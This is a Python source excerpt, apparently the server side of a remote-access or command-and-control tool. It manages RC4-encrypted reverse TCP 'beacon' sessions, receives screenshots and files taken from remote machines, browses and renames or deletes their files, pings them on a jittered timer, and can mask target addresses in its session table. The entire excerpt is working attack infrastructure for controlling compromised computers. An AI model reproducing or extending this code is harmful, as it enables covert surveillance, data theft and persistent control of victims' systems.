    def handle_client(self, client_socket, address, session_uuid):
        session_id = f"Reverse TCP - RC4 - {session_uuid}"
        self.execution_status[session_id] = False
        try:
            while self.is_running:
                try:
                    encrypted_data = recv_data(client_socket)
                    if encrypted_data is None:
                        break
                    if encrypted_data == b'':
                        continue
                    decrypted_text = self.rc4_cipher_instance.crypt(encrypted_data).decode(errors="ignore")
                    if decrypted_text == "pong":
                        with self.lock:
                            session_data = self.active_sessions.get(session_id)
                            if session_data is not None:
                                session_data["last_seen"] = time.time()
                        continue
                    if decrypted_text:
                        self.execution_status[session_id] = False
                    if decrypted_text.startswith("screenshot-"):
                        base64_data = decrypted_text[11:]
                        self.save_screenshot_window(base64_data, session_id)
                    elif decrypted_text.startswith("browse-data-"):
                        base64_data = decrypted_text[12:]
                        json_str = base64.b64decode(base64_data).decode('utf-8')
                        dir_data = json.loads(json_str)
                        if dir_data.get("success"):
                            self.open_file_browse_window(dir_data, session_id, self.os_type)
                        else:
                            self.update_output_text(f"[-] Error: {dir_data.get('error')}\n\n", is_general=False, session_name=session_id)
                    elif decrypted_text.startswith("file-data:"):
                        parts = decrypted_text[10:].split('|', 2)
                        if len(parts) == 3:
                            filename, filesize_str, filedata_b64 = parts
                            self.save_file_from_browse(session_id, filename, filedata_b64)
                    elif decrypted_text.startswith("SUCCESS:") or decrypted_text.startswith("ERROR:"):
                        if "Deleted" in decrypted_text or "Renamed" in decrypted_text:
                            browse = self.browse_windows.get(session_id)
                            if browse is not None and browse.window_file_browse is not None:
                                browse.fetch_directory(browse.current_path)
                    else:
                        self.update_output_text(f"{decrypted_text}\n\n", is_general=False, session_name=session_id)
                except socket.timeout:
                    continue
                except Exception as e:
                    self.update_output_text(f"[-] Error with client {address}: {e}\n", is_general=True)
                    break
        except Exception as e:
            self.update_output_text(f"[-] Error with client {address}: {e}\n", is_general=True)
        finally:
            self.update_output_text(f"[-] Client {address} disconnected.\n\n", is_general=True)
            try:
                if client_socket:
                    client_socket.close()
            except:
                pass
            with self.lock:
                self.sessions.pop(session_uuid, None)
                session_data = self.active_sessions.get(session_id)
                if session_data is not None:
                    session_data["manual_disconnect"] = True
                    if self.session_limiting_enable:
                        self.current_active_sessions = max(0, self.current_active_sessions - 1)
                self.execution_status[session_id] = False
    def schedule_keep_alive_ping(self):
        if not self.is_running:
            return
        self.keep_alive_ping()
        jitter_seconds = random.randint(self.start_jitter, self.end_jitter)
        sleep_fraction = self.Sleep / 1000.0
        total_seconds = jitter_seconds + sleep_fraction
        threading.Timer(total_seconds, self.schedule_keep_alive_ping).start()
    def keep_alive_ping(self):
        with self.lock:
            for session_id, session_data in list(self.active_sessions.items()):
                if session_data is None:
                    continue
                first_run = session_data.get("first_run", True)
                if first_run:
                    session_data["first_run"] = False
                try:
                    client_socket = session_data.get("socket")
                    if client_socket is None:
                        continue
                    send_data(client_socket, self.rc4_cipher_instance.crypt("ping".encode()))
                except:
                    self.active_sessions.pop(session_id, None)
    def track_session_time(self, session_id, client_socket, address, pid, ark):
        start_time = time.time()
        ip, port = address
        total_elapsed = 0
        last_update = start_time
        blink_counter = 0
        saved_time = "00:00:00"
        is_disconnected = False
        final_time = "00:00:00"
        def update():
            nonlocal total_elapsed, last_update, blink_counter, saved_time, is_disconnected, final_time
            session_item = None
            try:
                for child in self.session_table.get_children():
                    values = self.session_table.item(child)['values']
                    if values and len(values) > 0 and values[0] == session_id:
                        session_item = child
                        break
            except:
                return
            if session_item is None:
                return
            try:
                if not self.session_table.exists(session_item):
                    return
            except:
                return
            current_time = time.time()
            with self.lock:
                session_data = self.active_sessions.get(session_id)
                if session_data is None:
                    return
                last_seen = session_data.get("last_seen", start_time)
                manual_disconnect = session_data.get("manual_disconnect", False)
            since_last_seen = current_time - last_seen
            current_ip = f"{ip} : {port}"
            if self.hidden_addresses.get(session_id, False):
                current_ip = f"██████ : {port}"
            current_target = ark
            if self.hidden_addresses.get(session_id, False):
                current_target = "██████"
            is_executing = self.execution_status.get(session_id, False)
            is_reconnecting = since_last_seen > self.reconnect_delay_entry
            if manual_disconnect or since_last_seen > self.reconnect_timeout_entry or not self.is_running:
                if not is_disconnected:
                    is_disconnected = True
                    final_time = saved_time
                    status = f"Disconnected - {final_time}"
                try:
                    values = self.session_table.item(session_item)['values']
                    if values and len(values) >= 5:
                        self.session_table.item(session_item, values=(
                            session_id, current_ip, status, values[3], values[4], pid, current_target
                        ))
                    try:
                        self.session_table.tag_configure("Disconnected", background="black", foreground="#9D9D9D")
                    except:
                        pass
                    try:
                        if self.session_table.exists(session_item):
                            self.session_table.item(session_item, tags=("Disconnected",))
                    except:
                        pass
                except:
                    pass
                try:
                    with self.lock:
                        session_data = self.active_sessions.get(session_id)
                        if session_data is not None:
                            sock = session_data.get("socket")
                            if sock is not None:
                                try:
                                    sock.shutdown(socket.SHUT_RDWR)
                                except:
                                    pass
                                try:
                                    sock.close()
                                except:
                                    pass
                            self.active_sessions.pop(session_id, None)
                            if self.session_limiting_enable:
                                self.current_active_sessions = max(0, self.current_active_sessions - 1)
                    uuid_str = session_id.replace("Reverse TCP - ", "")
                    with self.lock:
                        self.sessions.pop(uuid_str, None)
                    if sock is not None:
                        self.client_sockets = [s for s in self.client_sockets if s != sock]
                except:
                    pass
                return
            if not is_reconnecting:
                if not is_disconnected:
                    total_elapsed += current_time - last_update
                    last_update = current_time
                    saved_time = str(datetime.timedelta(seconds=int(total_elapsed)))
            if is_executing:
                blink_counter += 1
                if blink_counter % 2 == 0:
                    status = f"Executing - {saved_time}"
                    try:
                        self.session_table.tag_configure("Executing", background="#D4A017", foreground="#FFFFFF")
                    except:
                        pass
                else:
                    status = f"Executing - {saved_time}"
                    try:
                        self.session_table.tag_configure("Executing", background="#1e2220", foreground="#FFFFFF")
                    except:
                        pass
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, tags=("Executing",))
                except:
                    pass
            elif since_last_seen > self.reconnect_delay_entry:
                status = f"Reconnecting - {saved_time}"
                try:
                    self.session_table.tag_configure("Reconnecting", background="#020B3F", foreground="#FFFFFF")
                except:
                    pass
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, tags=("Reconnecting",))
                except:
                    pass
            else:
                status = f"Active - {saved_time}"
                try:
                    self.session_table.tag_configure("Active", background="#1e2220", foreground="#FFFFFF")
                except:
                    pass
                try:
                    if self.session_table.exists(session_item):
                        self.session_table.item(session_item, tags=("Active",))
                except:
                    pass
            try:
                if self.session_table.exists(session_item):
                    values = self.session_table.item(session_item)['values']
                    if values and len(values) >= 5:
                        self.session_table.item(session_item, values=(
                            session_id, current_ip, status, values[3], values[4], pid, current_target
                        ))
            except Exception as e:
                pass
            self.main_application_window.after(1000, update)
        self.main_application_window.after(1000, update)
    def close_session_by_id(self, uuid_str):
        session = self.sessions.get(uuid_str)
        session_id = f"Reverse TCP - RC4 - {uuid_str}"
        if session is None:
            return False
        try:
            sock = session.get("socket")
            if sock is not None:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            with self.lock:
                session_data = self.active_sessions.get(session_id)
                if session_data is not None:
                    session_data["manual_disconnect"] = True
                    if self.session_limiting_enable:
                        self.current_active_sessions = max(0, self.current_active_sessions - 1)
                self.execution_status[session_id] = False
            return True
        except Exception as e:
            self.update_output_text(f"[-] Failed to disconnect beacon {uuid_str}: {e}\n", is_general=True)
            return False
    def stop_server(self):
        self.is_running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        with self.lock:
            for sock in self.client_sockets:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                    sock.close()
                except:
                    pass
            self.client_sockets.clear()
        try:
            dummy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            dummy_socket.settimeout(1)
            dummy_socket.connect((self.host, self.port))
            dummy_socket.close()
        except:
            pass
        for t in self.client_threads:
            t.join(timeout=1)
        self.execution_status.clear()
